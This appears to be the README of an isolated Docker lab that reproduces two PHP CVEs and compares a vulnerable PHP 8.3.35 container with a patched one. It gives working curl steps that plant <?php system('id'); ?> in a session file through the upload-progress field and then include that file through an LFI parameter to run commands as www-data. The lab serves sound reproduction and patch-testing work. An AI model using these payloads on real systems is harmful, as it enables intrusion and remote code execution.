# Kirubel — PHP2Shell Lab

Isolated lab reproducing CVE-2026-109619 and CVE-2026-109618 against a vulnerable
`php:8.3.35-apache` container, with a `php:8.3.36-apache` patched container as a
negative control.

## Requirements

- Docker Engine 20.10+
- Docker Compose v2

## Files

| File | Purpose |
|---|---|
| `docker-compose.yml` | Two services: `vulnerable-php` (PHP 8.3.35, host port 8080) and `patched-php` (PHP 8.3.36, host port 8081) |
| `index.php` | Deliberately vulnerable application — `session_start()`, upload form, LFI sink |
| `php.ini` | `memory_limit=8M`, `post_max_size=64M`, `session.upload_progress.enabled=On` |

## Container names

- `php2shell-target` — vulnerable (PHP 8.3.35)
- `php2shell-patched` — patched (PHP 8.3.36)

These names appear in the report §4 evidence. If you have another copy of this
lab already running under the same names, run `docker compose down` in the other
directory first.

## Start the lab

```bash
docker compose up -d
docker compose ps
Expected: both containers Up, ports 8080 and 8081 bound.

Verify the targets are reachable

curl -s -o /dev/null -w "vulnerable (8080) -> %{http_code}\n" http://localhost:8080/index.php
curl -s -o /dev/null -w "patched    (8081) -> %{http_code}\n" http://localhost:8081/index.php
Expected: 200 for both.

Reproduce the vulnerabilities (vulnerable target, port 8080)
CVE-2026-109619 (stale pointer / UAF)

# Step 1: poison the session file
curl -s -o /dev/null -w "POST -> %{http_code}\n" -X POST http://localhost:8080/index.php \
  -b "PHPSESSID=pentagi123" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=<?php system('id'); ?>" \
  -F "profile_pic=@/etc/hostname;filename=x.jpg"

# Step 2: trigger the LFI
curl -s http://localhost:8080/index.php?page=/tmp/sess_pentagi123 \
  -b "PHPSESSID=pentagi123" | grep -o "uid=[0-9]*([^)]*)"
Expected: POST -> 200 and uid=33(www-data) gid=33(www-data) in the LFI output.

CVE-2026-109618 (OOM corruption)

# Step 1: generate an oversized payload (> memory_limit, < post_max_size)
dd if=/dev/zero of=/tmp/bigfile.bin bs=1M count=9

# Step 2: send it
curl -s -o /dev/null -w "POST -> %{http_code}\n" -X POST http://localhost:8080/index.php \
  -b "PHPSESSID=pentagi618" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=<?php system('id'); ?>" \
  -F "profile_pic=@/tmp/bigfile.bin;filename=x.jpg"

# Step 3: trigger the LFI
curl -s http://localhost:8080/index.php?page=/tmp/sess_pentagi618 \
  -b "PHPSESSID=pentagi618" | grep -o "uid=[0-9]*([^)]*)"
Expected: POST -> 500 (OOM fired) and uid=33(www-data) in the LFI output.

Patched negative control (port 8081)
Run the identical two sequences against localhost:8081. Expected result:

POST returns 200 (patched binary handles the OOM gracefully; no crash)

LFI returns <h2>Viewing Page: /tmp/sess_pentagi_patched</h2><p>Page not found.</p>

No uid=... in the output — session file never created

Container	PHP	CVE-619 result	CVE-618 result
php2shell-target (8080)	8.3.35	RCE confirmed	RCE confirmed
php2shell-patched (8081)	8.3.36	Mitigated	Mitigated
Stop and clean up

docker compose down
Safety notes
The application is intentionally vulnerable. Never expose it to a network
beyond an isolated Docker host.

The patched container is a genuine negative control: same image base, same
index.php, same php.ini, only the PHP patch level differs. Any difference
in exploit behaviour is attributable to the patch, not the environment.
